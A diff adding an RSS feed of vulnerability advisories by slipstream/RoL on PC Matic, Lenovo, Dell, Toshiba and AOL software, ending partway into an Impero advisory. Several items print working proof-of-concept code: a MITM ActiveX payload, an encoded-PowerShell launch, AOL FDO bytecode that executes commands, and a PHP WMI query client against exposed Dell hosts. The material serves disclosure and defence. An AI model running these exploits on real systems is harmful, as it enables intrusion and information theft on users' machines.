@@ -1,0 +1,554 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>LizardHQ research</title>
+    <description></description>
+    <link>/</link>
+    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sat, 20 Aug 2016 17:45:56 +0200</pubDate>
+    <lastBuildDate>Sat, 20 Aug 2016 17:45:56 +0200</lastBuildDate>
+    <generator>Jekyll v2.5.3</generator>
+    
+      <item>
+        <title>Security Advisory: Multiple Critical Vulnerabilities in PCPitstop PC Matic</title>
+        <description>&lt;p&gt;&lt;em&gt;By slipstream/RoL.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;PC Matic &amp;quot;provides superior security protection over all security products, free or otherwise, on the market&amp;quot;.&lt;/p&gt;
+
+&lt;p&gt;An issue in PC Matic, versions 1.1.0.65 and below, can be exploited by an entity in a man-in-the-middle position to cause remote code execution, as SYSTEM or as a standard user.&lt;/p&gt;
+
+&lt;p&gt;Issues in PC Matic, versions 1.1.0.65 and below, can be exploited by a web page to potentially cause remote code execution as a standard user.&lt;/p&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;The PC Matic application is basically Internet Explorer. A version of IE that allows for certain objects like &lt;code&gt;WScript.Shell&lt;/code&gt; to be instantiated. The application loads a home page via HTTP, which then loads some javascript files, which among other things do call out to &lt;code&gt;WScript.Shell&lt;/code&gt;. An entity in a MITM position can easily intercept requests to &lt;code&gt;http://*.pcpitstop.com/Nirvana/*.js&lt;/code&gt; and respond with JavaScript of their choice, the traditional &lt;code&gt;calc.exe&lt;/code&gt; payload here being:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;WScript.Shell&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;calc.exe&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Additionally, the PC Matic installer installs a service that runs as SYSTEM, which essentially runs &lt;code&gt;wscript scan.wsf&lt;/code&gt; every hour, as SYSTEM. &lt;code&gt;scan.wsf&lt;/code&gt; basically GETS the contents of &lt;code&gt;http://www.pcpitstop.com/Nirvana/scheduledscanpack.js&lt;/code&gt; and then &lt;code&gt;eval()&lt;/code&gt;s it. So an entity in a MITM position can just wait up to an hour for the service to run their own JavaScript, as SYSTEM.&lt;/p&gt;
+
+&lt;p&gt;PC Matic also installs and uses several ActiveX controls, that are signed by a code signing certificate issued by Thawte. One of these ActiveX controls, &lt;code&gt;PCPitstop2.dll&lt;/code&gt;, exposes some interesting methods to IE. Some are limited to specific domains (however, any cross-site-scripting issue in the allowed domains would bypass this limitation). Some, however, are not; and so...&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;object&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Exam&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Exam&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;classid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;CLSID:FFB3A759-98B1-446F-BDA9-909C6EB18CC7&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/object&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Exam&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DeviceDriverInstallArguments&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;-EncodedCommand ...&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;InstallDriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;powershell.exe&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;})();&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;... would happily execute &lt;code&gt;powershell.exe -EncodedCommand ...&lt;/code&gt; with user permissions, assuming the user clicked Allow on the Protected Mode security warning. And, let&amp;#39;s face it: &lt;a href=&quot;https://twitter.com/WithinRafael/status/700617732593614848&quot;&gt;PC Matic shows advertisements on Fox News&lt;/a&gt;; these would &lt;em&gt;probably&lt;/em&gt; be the kind of users who&amp;#39;d just allow all the things. Not to mention they&amp;#39;d be the kind of users who still use IE, too.&lt;/p&gt;
+
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;1.1.0.65 and below.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Uninstallation of this software will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
+</description>
+        <pubDate>Fri, 19 Feb 2016 00:00:00 +0100</pubDate>
+        <link>/2016/02/19/pcmatic.html</link>
+        <guid isPermaLink="true">/2016/02/19/pcmatic.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Security Advisory: Toshiba Service Station Unauthorized Registry Read</title>
+        <description>&lt;p&gt;&lt;em&gt;By slipstream/RoL.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;Toshiba Service Station &amp;quot;allows your computer to automatically search for TOSHIBA software updates or other alerts from Toshiba that are specific to your computer system and its programs&amp;quot;.&lt;/p&gt;
+
+&lt;p&gt;An issue in Toshiba Service Station, versions 2.6.14 and below, can be exploited to read parts of the registry as SYSTEM by local users of lower privilege.&lt;/p&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;Toshiba Service Station installs a service named &lt;code&gt;TMachInfo&lt;/code&gt; that runs as SYSTEM and starts an XML-based API on localhost via UDP port 1233.&lt;/p&gt;
+
+&lt;p&gt;One of the methods exposed by this API is &lt;code&gt;Reg.Read&lt;/code&gt; which reads the provided registry value as SYSTEM, casts the result to a string, and returns the result.&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, due to .NET casting, &lt;code&gt;REG_BINARY&lt;/code&gt; values (like values in SAM, or the bootkey) cannot be read via this method, as casting a &lt;code&gt;byte[]&lt;/code&gt; to &lt;code&gt;string&lt;/code&gt; in .NET returns the string &lt;code&gt;&amp;quot;System.Byte[]&amp;quot;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;However, this method could be used to bypass any read-deny permissions on the registry for lower-privileged users.&lt;/p&gt;
+
+&lt;p&gt;A PoC is available as &lt;code&gt;loadofoldtosh.d&lt;/code&gt; in &lt;a href=&quot;http://rol.im/oemdrop/&quot;&gt;this trio of OEM exploit PoCs.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;Version 2.6.14 and below.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Uninstallation of this software will prevent exploitation of the issue. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 05 Dec 2015 00:00:00 +0100</pubDate>
+        <link>/2015/12/05/toshiba-service-station.html</link>
+        <guid isPermaLink="true">/2015/12/05/toshiba-service-station.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Security Advisory: Lenovo Solution Center Local Privilege Escalation</title>
+        <description>&lt;p&gt;&lt;em&gt;By slipstream/RoL.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;Lenovo Solution Center &amp;quot;allows users to quickly identify the status for system health, network connections and overall system security.&amp;quot;&lt;/p&gt;
+
+&lt;p&gt;Issues in Lenovo Solution Center, versions 3.1.004 and below, can be exploited to gain local privilege escalation to SYSTEM, and remote code execution as SYSTEM while Lenovo Solution Center is open.&lt;/p&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;Lenovo Solution Center installs a service, &lt;code&gt;LSCWinService&lt;/code&gt;, which Everyone has permissions to start, and runs as SYSTEM.&lt;/p&gt;
+
+&lt;p&gt;The service must be started using &lt;code&gt;sc.exe&lt;/code&gt; and passed specific arguments; when it is passed the argument &lt;code&gt;StartBackend&lt;/code&gt; it runs &lt;code&gt;LSCTaskService.exe&lt;/code&gt; as SYSTEM.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;LSCTaskService&lt;/code&gt; starts an HTTP API on localhost, port 55555, and GET or POST requests can be passed to it to execute methods out of specific classes in &lt;code&gt;LSCController.dll&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code&gt;Actions&lt;/code&gt; class, which is allowed to be called from the HTTP API, has a &lt;code&gt;RunInstaller&lt;/code&gt; method, which runs the provided executable argument from &lt;code&gt;%APPDATA%\LSC\Local Store&lt;/code&gt; as SYSTEM, where &lt;code&gt;%APPDATA%&lt;/code&gt; here is &lt;code&gt;C:\ProgramData&lt;/code&gt; on Windows Vista and above.&lt;/p&gt;
+
+&lt;p&gt;Any locally running code can copy an executable to this folder and use the HTTP API to run it as SYSTEM.&lt;/p&gt;
+
+&lt;p&gt;Additionally, the &lt;code&gt;RunInstaller&lt;/code&gt; method has a path traversal vulnerability, so any executable on &lt;code&gt;%SYSTEMDRIVE%&lt;/code&gt; can be run as SYSTEM.&lt;/p&gt;
+
+&lt;p&gt;There is no API token or referer check on the HTTP API, so cross site request forgery can be used to remotely execute any executable on &lt;code&gt;%SYSTEMDRIVE%&lt;/code&gt; as SYSTEM, if Lenovo Solution Center is running.&lt;/p&gt;
+
+&lt;p&gt;A PoC is available as &lt;code&gt;lenovoSYSTEMcenter.d&lt;/code&gt; (and on the page itself, there&amp;#39;s a link to exploit the CSRF) in &lt;a href=&quot;http://rol.im/oemdrop/&quot;&gt;this trio of OEM exploit PoCs.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;3.1.004 and below.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Uninstallation of this software will prevent exploitation of the issue. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 05 Dec 2015 00:00:00 +0100</pubDate>
+        <link>/2015/12/05/lenovo.html</link>
+        <guid isPermaLink="true">/2015/12/05/lenovo.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Security Advisory: Dell System Detect User Access Control (UAC) Bypass</title>
+        <description>&lt;p&gt;&lt;em&gt;By slipstream/RoL.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;Dell System Detect (DSD) is &amp;quot;an application that runs on your Windows-based PC or tablet with your permission and interacts with the Dell Support website so that we can provide a better and more personalized support experience.&amp;quot;&lt;/p&gt;
+
+&lt;p&gt;An issue in Dell System Detect, versions 6.12.0.1 and below, can be exploited to bypass UAC.&lt;/p&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;Dell System Detect starts an HTTPd on localhost that listen on one of four ports: 8884, 8883, 8886 or 8885.&lt;/p&gt;
+
+&lt;p&gt;The APIs exposed by this HTTPd are protected by two methods:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Referer and origin header checks, referer or origin domain must be one of several Dell-owned domains.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Specific API methods can only be called with the correct signature, generated via an RSA-1024 key.&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The first method can easily be bypassed by code running on the system (or a man-in-the-middle for that matter).&lt;/p&gt;
+
+&lt;p&gt;The second can also be easily bypassed, as specific pages on Dell&amp;#39;s site can be scraped to gain valid signatures for some interesting APIs.&lt;/p&gt;
+
+&lt;p&gt;The Dell System Detect executable has a valid code signature; and on startup, if not started with specific arguments it tries to elevate itself.&lt;/p&gt;
+
+&lt;p&gt;Assuming the user denies the elevation. the &lt;code&gt;checkadminrights&lt;/code&gt; API also tries to elevate. The API supposedly returns false if DSD is not elevated, but in practise, it returned true all the time.&lt;/p&gt;
+
+&lt;p&gt;This bug can be worked around by using the time that the request took to execute. With experimentation, it seems that if the API request had taken over 200ms, then a UAC request dialog had been spawned.&lt;/p&gt;
+
+&lt;p&gt;After the user has confirmed elevation, a wait must occur for DSD to restart its HTTPd. It seems a delay of 200ms every loop is adequate for this.&lt;/p&gt;
+
+&lt;p&gt;When DSD has been elevated, a second API, &lt;code&gt;installmanual&lt;/code&gt;, can be used to run any file. The &lt;code&gt;\\&lt;/code&gt; character is filtered out, but the &lt;code&gt;/&lt;/code&gt; character can be used as a replacement.&lt;/p&gt;
+
+&lt;p&gt;A PoC is available as &lt;code&gt;dellsystempwned.d&lt;/code&gt; in &lt;a href=&quot;http://rol.im/oemdrop/&quot;&gt;this trio of OEM exploit PoCs.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;6.12.0.1 and below.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Not even uninstallation of Dell System Detect will prevent exploitation of these issues; it runs from &lt;code&gt;%APPDATA%&lt;/code&gt; so malware could easily drop it on your system to exploit this issue.&lt;/p&gt;
+
+&lt;p&gt;The checkadminrights method is hardcoded to execute &lt;code&gt;DellSystemDetect.exe&lt;/code&gt; so, uninstallation of Dell System Detect and blacklisting of &lt;code&gt;DellSystemDetect.exe&lt;/code&gt; from being executed will prevent exploitation of these issues.&lt;/p&gt;
+
+&lt;p&gt;The researchers cannot sanction any mitigations except to perform these actions.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 05 Dec 2015 00:00:00 +0100</pubDate>
+        <link>/2015/12/05/dell-system-detect.html</link>
+        <guid isPermaLink="true">/2015/12/05/dell-system-detect.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Security Advisory: AOL Desktop MiTM Remote File Write and Code Execution</title>
+        <description>&lt;p&gt;&lt;em&gt;By slipstream/RoL.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;AOL Desktop is &amp;quot;the all-in-one experience with mail, instant messaging, browsing, search, content, and dial-up connectivity&amp;quot;. It is the direct successor of the old Windows AOL clients from the 1990s.&lt;/p&gt;
+
+&lt;p&gt;Issues in AOL Desktop, version 9.8.1 and below, that have existed since 1993, can be exploited by an entity in a man-in-the-middle position to write files to disk and cause remote command execution.&lt;/p&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;The custom AOL protocol involves a scripting language known as FDO91 (FDO). Packets sent between client and server, and server and client, include FDO91 that is compiled into a bytecode.&lt;/p&gt;
+
+&lt;p&gt;No authentication is done on any packets sent, and the client will execute any FDO it is sent by the server.&lt;/p&gt;
+
+&lt;p&gt;Some FDO opcodes are interesting from an attacker&amp;#39;s perspective. The &lt;code&gt;fm_*&lt;/code&gt; series of opcodes (the File Management protocol, &lt;code&gt;0x08xx&lt;/code&gt;), have existed since the very first version of AOL for Windows from 1993. This series of opcodes enables reading from and writing to disk.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code&gt;async_exec_app&lt;/code&gt; opcode (&lt;code&gt;0x0d19&lt;/code&gt;) takes a string operand, and executes the command in that string. This opcode has existed since version 2.0 of AOL for Windows, from 1994.&lt;/p&gt;
+
+&lt;p&gt;The snippet of FDO that follows attempts to write &lt;code&gt;pwned.txt&lt;/code&gt; to disk and execute &lt;code&gt;notepad.exe&lt;/code&gt; with the path to &lt;code&gt;pwned.txt&lt;/code&gt; as an argument:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;fm_start
+fm_item_type &amp;lt;filename&amp;gt;
+fm_item_set &amp;lt;&amp;quot;pwned.txt&amp;quot;&amp;gt;
+fm_item_type &amp;lt;path&amp;gt;
+cm_tb_get_path
+uni_use_last_atom_string &amp;lt;fm_item_set&amp;gt;
+fm_item_get &amp;lt;filespec&amp;gt;
+uni_use_last_atom_string &amp;lt;var_string_set, 01x&amp;gt;
+fm_create_file
+fm_open_file &amp;lt;01x&amp;gt;
+fm_append_data &amp;lt;&amp;quot;AOL pwned clientside through MITM...\r\nReading/writing to FS and arbitrary command execution 1993-2015 :)&amp;quot;&amp;gt;
+fm_flush_file
+fm_close_file
+fm_end
+var_string_set &amp;lt;A,&amp;quot;notepad.exe \&amp;quot;&amp;quot;&amp;gt;
+var_string_concatenate_regs &amp;lt;A,B&amp;gt;
+var_string_set &amp;lt;B,&amp;quot;\&amp;quot;&amp;quot;&amp;gt;
+var_string_concatenate_regs &amp;lt;A,B&amp;gt;
+var_string_get &amp;lt;A&amp;gt;
+uni_use_last_atom_string &amp;lt;async_exec_app&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;a href=&quot;https://gist.github.com/Wack0/c1929ab5d29c83473bd4&quot;&gt;A proof of concept is available&lt;/a&gt; that creates a MITM proxy that modifies a specific packet to add the bytecode of the above FDO to the end of that packet&amp;#39;s original FDO and update the length.&lt;/p&gt;
+
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;9.8.1 and below. It is not known whether the betas of 9.8.2 are affected.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Uninstallation of this software will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 05 Dec 2015 00:00:00 +0100</pubDate>
+        <link>/2015/12/05/aol-desktop.html</link>
+        <guid isPermaLink="true">/2015/12/05/aol-desktop.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Security Advisory: Dell Foundation Services Remote Information Disclosure (II)</title>
+        <description>&lt;p&gt;&lt;em&gt;By slipstream/RoL.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;Dell Foundation Services (otherwise known by its internal name of &amp;quot;Tribbles&amp;quot;) &amp;quot;provides a core set of foundational services facilitating customer serviceability, messaging and support functions&amp;quot;.&lt;/p&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;Dell Foundation Services starts an HTTPd that listens on port 7779. The previous service tag leak was fixed by removing the JSONP API.&lt;/p&gt;
+
+&lt;p&gt;However, the webservice in question is still available; it is now a SOAP service, and all methods of that webservice can be accessed, not just the ServiceTag method.&lt;/p&gt;
+
+&lt;p&gt;One of the methods accessible is &lt;code&gt;List&amp;lt;WmiManagementItem&amp;gt; GetWmiCollection(string wmiQuery)&lt;/code&gt; - this returns the results of a given Windows Management Instrumentation (WMI) query, enabling access to information about hardware, installed software, running processes, installed services, accessible hard disks, filesystem metadata (filenames, file size, dates) and more.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/aa394582(v=vs.85).aspx&quot;&gt;WMI&lt;/a&gt; is &amp;quot;the infrastructure for management data and operations on Windows-based operating systems&amp;quot;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.shodan.io/search?query=port%3A7779+httpapi+404&amp;amp;language=None&quot;&gt;Many potentially vulnerable hosts can be found via Shodan&lt;/a&gt; and the issue can also be exploited over a LAN.&lt;/p&gt;
+
+&lt;p&gt;Quick PHP one-liner proof-of-concept:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;php -r &amp;quot;function wmic($ip,$query) { var_dump(dowmic($ip,$query)); } function dowmic($ip,$query) { return callApi($ip,&amp;#39;GetWmiCollection&amp;#39;,array(new SoapVar($query,XSD_STRING,null,null,&amp;#39;wmiQuery&amp;#39;,&amp;#39;http://tempuri.org/&amp;#39;))); } function callApi($ip,$method,$params = array()) { return (new SoapClient(null,array(&amp;#39;location&amp;#39;=&amp;gt;&amp;#39;http://&amp;#39;.$ip.&amp;#39;:7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi&amp;#39;,&amp;#39;uri&amp;#39;=&amp;gt;&amp;#39;http://tempuri.org/&amp;#39;)))-&amp;gt;__soapCall($method,$params,array(&amp;#39;soapaction&amp;#39;=&amp;gt;&amp;#39;http://tempuri.org/ISystemInfoCapabilitiesApi/&amp;#39;.$method)); } wmic(&amp;#39;&amp;#39;,&amp;#39;&amp;#39;);&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This can be expanded to:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;?php
+function wmic($ip,$query) {
+    var_dump(dowmic($ip,$query));
+}
+
+function dowmic($ip,$query) {
+    return callApi($ip,&amp;#39;GetWmiCollection&amp;#39;,array(new SoapVar($query,XSD_STRING,null,null,&amp;#39;wmiQuery&amp;#39;,&amp;#39;http://tempuri.org/&amp;#39;)));
+}
+
+function callApi($ip,$method,$params = array()) {
+    return (
+        new SoapClient(null,array(&amp;#39;location&amp;#39;=&amp;gt;&amp;#39;http://&amp;#39;.$ip.&amp;#39;:7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi&amp;#39;,&amp;#39;uri&amp;#39;=&amp;gt;&amp;#39;http://tempuri.org/&amp;#39;))
+    )-&amp;gt;__soapCall($method,$params,array(&amp;#39;soapaction&amp;#39;=&amp;gt;&amp;#39;http://tempuri.org/ISystemInfoCapabilitiesApi/&amp;#39;.$method));
+}
+
+wmic(&amp;#39;&amp;#39;,&amp;#39;&amp;#39;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;3.0.700.0.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Uninstallation of Dell Foundation Services will prevent exploitation of the issue. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 01 Dec 2015 00:00:00 +0100</pubDate>
+        <link>/2015/12/01/dell-foundation-services.2.html</link>
+        <guid isPermaLink="true">/2015/12/01/dell-foundation-services.2.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Security Advisory: Dell Foundation Services Remote Information Disclosure</title>
+        <description>&lt;p&gt;&lt;em&gt;By slipstream/RoL.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;Dell Foundation Services (otherwise known by its internal name of &amp;quot;Tribbles&amp;quot;) &amp;quot;provides a core set of foundational services facilitating customer serviceability, messaging and support functions&amp;quot;.&lt;/p&gt;
+
+&lt;p&gt;An issue in Dell Foundation Services, version 2.3.3800.0A00 and below, can be exploited by a malicious website to leak the Dell service tag of a Dell system, which can be used for tracking purposes, or for social engineering.&lt;/p&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;Dell Foundation Services starts a HTTPd that listens on port 7779. Generally, requests to the API exposed by this HTTPd must be requests signed using a RSA-1024 key and hashed with SHA512.&lt;/p&gt;
+
+&lt;p&gt;One of the JSONP API endpoints to obtain the service tag does not need a valid signature to be provided; thus, any website can call it.&lt;/p&gt;
+
+&lt;p&gt;This endpoint is a part of eDell however, and this part of Tribbles gets removed with the tool and instructions to remove the eDellRoot certificate.&lt;/p&gt;
+
+&lt;p&gt;However, another JSONP API endpoint exists to obtain the service tag. This endpoint requires a valid signature, but this signature is provided in the JavaScript on several pages of dell.com, and thus can be scraped.&lt;/p&gt;
+
+&lt;p&gt;A proof-of-concept to exploit these issues is available at &lt;a href=&quot;http://rol.im/dell/&quot;&gt;here&lt;/a&gt; and you can view the source of that page to obtain almost all of the required technical information needed to exploit.&lt;/p&gt;
+
+&lt;p&gt;The missing piece is getrequest.php, which scrapes Dell&amp;#39;s site to obtain the needed information to call the second JSONP API endpoint:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;?php
+
+$f = file_get_contents(&amp;quot;http://www.dell.com/support/home/us/en/04&amp;quot;);
+
+$signature = array_shift(explode(&amp;quot;&amp;#39;;&amp;quot;,array_pop(explode(&amp;quot;var dfsSignatureToken = &amp;#39;&amp;quot;,$f))));
+$expires = array_shift(explode(&amp;quot;&amp;#39;;&amp;quot;,array_pop(explode(&amp;quot;var tokenExpires = &amp;#39;&amp;quot;,$f))));
+$interface = array_shift(explode(&amp;quot;&amp;#39;;&amp;quot;,array_pop(explode(&amp;quot;var dfsInterfaceApi = &amp;#39;&amp;quot;,$f))));
+$url = array_shift(explode(&amp;quot;&amp;#39;;&amp;quot;,array_pop(explode(&amp;quot;var DFSUrl = &amp;#39;&amp;quot;,$f))));
+
+echo json_encode( (object) array(
+    &amp;quot;signature&amp;quot;=&amp;gt;$signature,
+    &amp;quot;expires&amp;quot;=&amp;gt;$expires,
+    &amp;quot;interface&amp;quot;=&amp;gt;$interface,
+    &amp;quot;url&amp;quot;=&amp;gt;$url
+));
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;2.3.3800.0A00 and below.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Uninstallation of Dell Foundation Services will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
+</description>
+        <pubDate>Wed, 25 Nov 2015 00:00:00 +0100</pubDate>
+        <link>/2015/11/25/dell-foundation-services.html</link>
+        <guid isPermaLink="true">/2015/11/25/dell-foundation-services.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Security Advisory: Multiple Critical Vulnerabilities in Impero Education Pro (II)</title>
+        <description>&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.imperosoftware.co.uk/&quot;&gt;Impero Education Pro&lt;/a&gt; is &amp;quot;a single, feature rich solution combining network management, desktop management and classroom management software for education&amp;quot;.&lt;/p&gt;
+
+&lt;p&gt;Issues in Impero Education Pro, version 5.0.03 to 5.1.04, can be exploited to cause remote command execution on every client.&lt;/p&gt;
+
+&lt;h1&gt;Disclosure note&lt;/h1&gt;
+
